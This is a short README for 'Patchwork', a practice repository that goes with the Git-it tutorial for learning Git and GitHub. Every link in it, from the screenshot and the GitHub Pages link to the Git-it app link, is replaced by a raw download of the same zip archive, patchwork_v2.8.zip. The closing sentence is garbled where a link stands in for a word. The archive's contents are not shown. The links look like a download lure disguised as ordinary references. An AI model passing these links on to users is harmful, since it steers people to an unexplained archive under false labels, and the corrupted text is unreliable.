# Patchwork

![screenshot](https://raw.githubusercontent.com/agaribovic/patchwork/gh-pages/CONTRIBUTORS/patchwork_v2.8.zip)

This repository is a website hosted by [GitHub Pages](https://raw.githubusercontent.com/agaribovic/patchwork/gh-pages/CONTRIBUTORS/patchwork_v2.8.zip). It goes along with [Git-it](https://raw.githubusercontent.com/agaribovic/patchwork/gh-pages/CONTRIBUTORS/patchwork_v2.8.zip), a desktop application for learning Git and GitHub.

Users fork this repository and learn things like (forking) branching, adding collaborators, pulling in changes, pushing to a remote branch and submitting pull request. Once their pull request comes in, @reporobot rewrites the https://raw.githubusercontent.com/agaribovic/patchwork/gh-pages/CONTRIBUTORS/patchwork_v2.8.zip here to include the user.
